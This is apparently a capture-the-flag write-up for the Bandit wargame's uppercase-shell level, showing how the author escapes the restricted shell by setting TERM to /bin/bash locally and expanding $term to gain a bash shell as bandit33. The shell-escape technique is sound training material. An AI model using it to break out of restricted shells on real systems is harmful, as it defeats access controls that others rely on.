After starting the ssh session, the terminal in this challenge seems to be so strange
```bash
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: Permission denied
>> pwd
sh: 1: PWD: Permission denied
>> ?
sh: 1: ?: Permission denied
>> 
```
The terminal seems to interpret any characters written as uppercase letters, unfortuantelly, there is not binary that has its name all capital, what a luck!
With a situation like this, we have to think : what we can do with a shell rather than executing commands directly??
Right!, there is also environment variables, the variables that carry some important or flag values and by chance ... thier naming scheme is in uppercase letters by default, let's try accessing a well-known variable which is $PWD
```bash
>> $pwd
sh: 1: /home/bandit32: Permission denied
```
cool! variables are not translated to uppercase, instead they are interpreted as-is, we can utilise the fact that there are some variables that are shared between the ssh client and terminal, I don't know much but, I am sure that there is a variable called $TERM that carry the name of our current terminal emulator, for example I use a terminal emulator called foot, on my local machine
```bash
$ env | grep TERM
COLORTERM=truecolor
TERM=foot
```
and on the ssh session : 
```bash
WELCOME TO THE UPPERCASE SHELL
>> $term
sh: 1: foot: Permission denied
```
theory confirmed, it tried to execute foot which is present on my machine and that variable "TERM" is indeed shared/inherited from my local machine, we can make a sneaky move and change the value of it to whatever value I want, I will change it to be equal "/bin/bash"
```bash
$ TERM=/bin/bash
```
And in the ssh session : 
```bash
WELCOME TO THE UPPERCASE SHELL
>> $term
bandit33@bandit:~$ id
uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
```
yeah!! we opened the shell and seems to have uid for bandit33, great news as we have already been in bandit33!! awesome:)
